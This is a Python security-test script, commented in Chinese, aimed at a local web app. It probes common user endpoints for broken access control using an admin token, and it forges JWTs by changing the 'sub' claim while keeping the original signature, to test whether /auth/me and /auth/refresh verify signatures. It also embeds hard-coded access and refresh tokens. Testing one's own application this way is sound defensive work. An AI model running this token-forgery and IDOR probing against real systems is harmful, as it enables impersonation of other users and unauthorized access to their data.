# -*- coding: utf-8 -*-
import requests
import base64
import json
import time

# ================== 配置区 ==================
BASE_URL = "http://127.0.0.1:8001"

# 你的 admin 的 Access Token（从登录响应中获取）
ACCESS_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTc3NTcyMjcyOCwiaWF0IjoxNzc1NzIwOTI4LCJ0eXBlIjoiYWNjZXNzIiwianRpIjoiQllGOG5pRGNvZFpESnpZc20wbGs3ZyJ9.Wozoj5hhk_4Grx6jNVyLaR_6aTqp8_oEJIk_tQNbRKw"

# 你的 admin 的 Refresh Token（从登录响应中获取）
REFRESH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTc3NjMyNTcyOCwiaWF0IjoxNzc1NzIwOTI4LCJ0eXBlIjoicmVmcmVzaCIsImp0aSI6IldyYmhoWkx5STQyT1FkaC1yOWVTN3cifQ.OyS1wFic4xrXH8VeX4uc4sy2t2Z35tPhFxun562iejQ"

# 目标用户信息
TARGET_USERNAME = "admin1"
TARGET_ID = 2

# 常见的可能泄露用户数据的 API 路径（{} 会被替换为 ID 或 用户名）
ENDPOINTS = [
    "/user/{}",
    "/users/{}",
    "/api/user/{}",
    "/profile/{}",
    "/auth/user/{}",
    "/user?id={}",
    "/users?username={}",
]

# ================== 辅助函数 ==================
def request_with_token(method, path, token, token_type="access", data=None):
    """发送带 token 的请求，token_type 为 'access' 或 'refresh'"""
    url = BASE_URL + path
    headers = {"Authorization": f"Bearer {token}"}
    if data is not None:
        headers["Content-Type"] = "application/json"
    try:
        if method.upper() == "GET":
            resp = requests.get(url, headers=headers, timeout=5)
        elif method.upper() == "POST":
            resp = requests.post(url, headers=headers, json=data, timeout=5)
        else:
            return None
        return resp
    except Exception as e:
        print(f"请求失败: {method} {path} - {e}")
        return None

def contains_target_user(resp_text):
    """检查响应文本中是否包含目标用户名或ID"""
    lower_text = resp_text.lower()
    return (TARGET_USERNAME.lower() in lower_text) or (str(TARGET_ID) in lower_text)

def forge_jwt(original_token, new_sub, token_type="access"):
    """
    修改 JWT 的 sub 字段，保留原签名（用于测试签名验证）
    返回伪造的 token 字符串
    """
    try:
        parts = original_token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        header_b64, payload_b64, signature = parts
        # 解码 payload
        payload_json = base64.urlsafe_b64decode(payload_b64 + "==").decode('utf-8')
        payload = json.loads(payload_json)
        # 修改 sub
        payload["sub"] = new_sub
        # 重新编码 payload（紧凑格式，无多余空格）
        new_payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip("=")
        forged = f"{header_b64}.{new_payload_b64}.{signature}"
        return forged
    except Exception as e:
        print(f"伪造 {token_type} token 时出错: {e}")
        return None

# ================== 1. 越权接口探测 ==================
print("[*] ===== 1. 越权接口探测 =====")
print(f"[*] 使用 admin 的 Access Token 尝试访问 {TARGET_USERNAME} (id={TARGET_ID}) 的数据\n")

vuln_found = False
for endpoint_template in ENDPOINTS:
    # 尝试替换 ID
    if "{}" in endpoint_template:
        path_id = endpoint_template.format(TARGET_ID)
        resp = request_with_token("GET", path_id, ACCESS_TOKEN)
        if resp and resp.status_code == 200 and contains_target_user(resp.text):
            print(f"[!] 越权漏洞！路径: {path_id}")
            print(f"    响应片段: {resp.text[:200]}")
            vuln_found = True
        # 如果路径中包含 username 字样，也尝试用用户名替换
        if "username" in endpoint_template:
            path_user = endpoint_template.format(TARGET_USERNAME)
            resp2 = request_with_token("GET", path_user, ACCESS_TOKEN)
            if resp2 and resp2.status_code == 200 and contains_target_user(resp2.text):
                print(f"[!] 越权漏洞！路径: {path_user}")
                print(f"    响应片段: {resp2.text[:200]}")
                vuln_found = True
    else:
        # 无占位符的直接请求
        resp = request_with_token("GET", endpoint_template, ACCESS_TOKEN)
        if resp and resp.status_code == 200 and contains_target_user(resp.text):
            print(f"[!] 越权漏洞！路径: {endpoint_template}")
            print(f"    响应片段: {resp.text[:200]}")
            vuln_found = True

if not vuln_found:
    print("[-] 未发现明显的越权接口（所有请求均返回 403/404 或非目标用户数据）")

# ================== 2. JWT 伪造测试（Access Token） ==================
print("\n[*] ===== 2. JWT 伪造测试（Access Token） =====")
forged_access = forge_jwt(ACCESS_TOKEN, TARGET_USERNAME, "access")
if forged_access:
    print(f"[*] 伪造的 Access Token (sub={TARGET_USERNAME}): {forged_access[:60]}...")
    resp = request_with_token("GET", "/auth/me", forged_access)
    if resp:
        if resp.status_code == 200:
            if contains_target_user(resp.text):
                print("[!] 严重漏洞：JWT 签名未验证！使用伪造的 token 成功获取了目标用户的信息！")
                print(f"    响应内容: {resp.text[:300]}")
            else:
                print("[-] 伪造的 token 被接受，但返回的数据不是目标用户（可能仍返回了 admin 的信息）。")
                print(f"    响应内容: {resp.text[:300]}")
        elif resp.status_code in (401, 403):
            print("[-] JWT 签名验证正常，伪造的 token 被拒绝。")
        else:
            print(f"[-] 请求返回意外状态码: {resp.status_code}")
    else:
        print("[-] 请求失败，请检查服务器是否运行。")
else:
    print("[-] 伪造 Access Token 失败，跳过测试。")

# ================== 3. Refresh Token 伪造测试 ==================
print("\n[*] ===== 3. Refresh Token 伪造测试 =====")
forged_refresh = forge_jwt(REFRESH_TOKEN, TARGET_USERNAME, "refresh")
if forged_refresh:
    print(f"[*] 伪造的 Refresh Token (sub={TARGET_USERNAME}): {forged_refresh[:60]}...")
    # 尝试用伪造的 refresh_token 去刷新 access_token
    refresh_payload = {"refresh_token": forged_refresh}
    resp = request_with_token("POST", "/auth/refresh", ACCESS_TOKEN, data=refresh_payload)
    if resp:
        if resp.status_code == 200:
            try:
                new_access = resp.json().get("data", {}).get("access_token")
                if new_access:
                    print("[!] 严重漏洞：Refresh Token 签名未验证！使用伪造的 refresh_token 成功获取了新 Access Token！")
                    print(f"    新 Access Token 前60字符: {new_access[:60]}...")
                    # 进一步验证：用这个新的 Access Token 访问 /auth/me
                    me_resp = request_with_token("GET", "/auth/me", new_access)
                    if me_resp and me_resp.status_code == 200:
                        if contains_target_user(me_resp.text):
                            print("[!] 确认：伪造 refresh_token 导致完全冒充目标用户！")
                        else:
                            print("[-] 新 Access Token 有效，但访问 /auth/me 返回的不是目标用户数据。")
                else:
                    print("[-] 刷新接口返回200但未包含 access_token，响应格式异常。")
            except Exception as e:
                print(f"[-] 解析刷新响应时出错: {e}")
        elif resp.status_code in (401, 403):
            print("[-] Refresh Token 签名验证正常，伪造的 token 被拒绝。")
        else:
            print(f"[-] 刷新请求返回意外状态码: {resp.status_code}")
    else:
        print("[-] 刷新请求失败，请检查服务器是否运行。")
else:
    print("[-] 伪造 Refresh Token 失败，跳过测试。")

print("\n[*] 测试完成。")